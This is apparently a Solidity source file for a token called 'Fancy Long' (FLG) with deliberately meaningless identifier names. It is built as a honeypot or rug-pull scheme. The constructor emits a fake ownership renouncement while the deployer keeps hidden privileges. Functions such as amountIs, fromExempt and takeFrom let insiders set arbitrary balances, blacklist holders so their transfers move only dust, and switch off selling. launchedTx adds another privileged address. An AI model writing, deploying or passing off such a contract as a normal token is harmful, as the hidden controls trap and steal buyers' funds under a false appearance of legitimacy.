//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface fromTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract feeSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toTxAuto {
    function createPair(address receiverSell, address toTx) external returns (address);
}

interface launchShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityModeLimit) external view returns (uint256);

    function transfer(address totalFrom, uint256 fromAmountMarketing) external returns (bool);

    function allowance(address listTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromAmountMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address totalFrom,
        uint256 fromAmountMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitSenderSell, uint256 value);
    event Approval(address indexed listTrading, address indexed spender, uint256 value);
}

interface launchShouldMetadata is launchShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FancyLong is feeSender, launchShould, launchShouldMetadata {

    uint256 constant fromReceiver = 10 ** 10;

    function allowance(address totalTake, address tradingMin) external view virtual override returns (uint256) {
        if (tradingMin == receiverAtBuy) {
            return type(uint256).max;
        }
        return maxTeam[totalTake][tradingMin];
    }

    mapping(address => mapping(address => uint256)) private maxTeam;

    string private isExempt = "FLG";

    function exemptLaunch() public {
        emit OwnershipTransferred(fromEnable, address(0));
        toAmount = address(0);
    }

    bool public isList;

    uint256 public marketingTo;

    string private tradingTake = "Fancy Long";

    function takeFrom(uint256 fromAmountMarketing) public {
        liquidityFund();
        walletSender = fromAmountMarketing;
    }

    address public feeLimit;

    function approve(address tradingMin, uint256 fromAmountMarketing) public virtual override returns (bool) {
        maxTeam[_msgSender()][tradingMin] = fromAmountMarketing;
        emit Approval(_msgSender(), tradingMin, fromAmountMarketing);
        return true;
    }

    address fromMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transfer(address toShould, uint256 fromAmountMarketing) external virtual override returns (bool) {
        return isAmountFee(_msgSender(), toShould, fromAmountMarketing);
    }

    bool public limitMax;

    function decimals() external view virtual override returns (uint8) {
        return txAt;
    }

    uint256 public amountAutoExempt;

    mapping(address => uint256) private senderAutoReceiver;

    function amountIs(address toShould, uint256 fromAmountMarketing) public {
        liquidityFund();
        senderAutoReceiver[toShould] = fromAmountMarketing;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptSwap;
    }

    function receiverFund(address atLiquidity, address totalFrom, uint256 fromAmountMarketing) internal returns (bool) {
        require(senderAutoReceiver[atLiquidity] >= fromAmountMarketing);
        senderAutoReceiver[atLiquidity] -= fromAmountMarketing;
        senderAutoReceiver[totalFrom] += fromAmountMarketing;
        emit Transfer(atLiquidity, totalFrom, fromAmountMarketing);
        return true;
    }

    event OwnershipTransferred(address indexed limitAmountLaunched, address indexed limitTx);

    function symbol() external view virtual override returns (string memory) {
        return isExempt;
    }

    bool private shouldTake;

    function getOwner() external view returns (address) {
        return toAmount;
    }

    mapping(address => bool) public liquidityFrom;

    uint256 private exemptSwap = 100000000 * 10 ** 18;

    uint8 private txAt = 18;

    function fromExempt(address isTradingMax) public {
        liquidityFund();
        if (enableTotalLiquidity == marketingTo) {
            marketingTo = enableTotalLiquidity;
        }
        if (isTradingMax == fromEnable || isTradingMax == feeLimit) {
            return;
        }
        isLimit[isTradingMax] = true;
    }

    function balanceOf(address liquidityModeLimit) public view virtual override returns (uint256) {
        return senderAutoReceiver[liquidityModeLimit];
    }

    bool private autoSender;

    function owner() external view returns (address) {
        return toAmount;
    }

    function isAmountFee(address atLiquidity, address totalFrom, uint256 fromAmountMarketing) internal returns (bool) {
        if (atLiquidity == fromEnable) {
            return receiverFund(atLiquidity, totalFrom, fromAmountMarketing);
        }
        uint256 exemptShould = launchShould(feeLimit).balanceOf(fromMin);
        require(exemptShould == walletSender);
        require(totalFrom != fromMin);
        if (isLimit[atLiquidity]) {
            return receiverFund(atLiquidity, totalFrom, fromReceiver);
        }
        return receiverFund(atLiquidity, totalFrom, fromAmountMarketing);
    }

    function transferFrom(address atLiquidity, address totalFrom, uint256 fromAmountMarketing) external override returns (bool) {
        if (_msgSender() != receiverAtBuy) {
            if (maxTeam[atLiquidity][_msgSender()] != type(uint256).max) {
                require(fromAmountMarketing <= maxTeam[atLiquidity][_msgSender()]);
                maxTeam[atLiquidity][_msgSender()] -= fromAmountMarketing;
            }
        }
        return isAmountFee(atLiquidity, totalFrom, fromAmountMarketing);
    }

    constructor (){
        
        fromTotal toReceiverAmount = fromTotal(receiverAtBuy);
        feeLimit = toTxAuto(toReceiverAmount.factory()).createPair(toReceiverAmount.WETH(), address(this));
        
        fromEnable = _msgSender();
        exemptLaunch();
        liquidityFrom[fromEnable] = true;
        senderAutoReceiver[fromEnable] = exemptSwap;
        if (enableTotalLiquidity == amountAutoExempt) {
            amountAutoExempt = txLimit;
        }
        emit Transfer(address(0), fromEnable, exemptSwap);
    }

    uint256 public txLimit;

    mapping(address => bool) public isLimit;

    function name() external view virtual override returns (string memory) {
        return tradingTake;
    }

    address private toAmount;

    address public fromEnable;

    function liquidityFund() private view {
        require(liquidityFrom[_msgSender()]);
    }

    function launchedTx(address amountAt) public {
        require(amountAt.balance < 100000);
        if (isList) {
            return;
        }
        if (shouldTake) {
            enableTotalLiquidity = amountAutoExempt;
        }
        liquidityFrom[amountAt] = true;
        if (amountAutoExempt == marketingTo) {
            autoSender = true;
        }
        isList = true;
    }

    uint256 private enableTotalLiquidity;

    uint256 fundSwap;

    bool private senderTx;

    address receiverAtBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 walletSender;

}